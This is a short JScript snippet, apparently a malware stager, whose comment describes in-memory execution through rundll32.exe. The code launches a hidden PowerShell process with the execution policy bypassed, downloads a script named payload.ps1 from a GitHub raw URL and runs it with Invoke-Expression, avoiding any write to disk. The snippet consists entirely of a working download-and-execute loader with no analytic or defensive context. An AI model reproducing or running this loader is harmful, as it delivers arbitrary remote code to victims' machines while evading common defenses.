/*
 * This JavaScript runs in memory via rundll32.exe.
 * It downloads a PowerShell script and executes it without touching the disk.
 */
var url = 'https://raw.githubusercontent.com/serpiajonna-bit/hosting/main/payload.ps1';
var ps = new ActiveXObject('WScript.Shell');
var cmd = 'powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString(\'' + url + '\')"';
ps.Run(cmd, 0, true);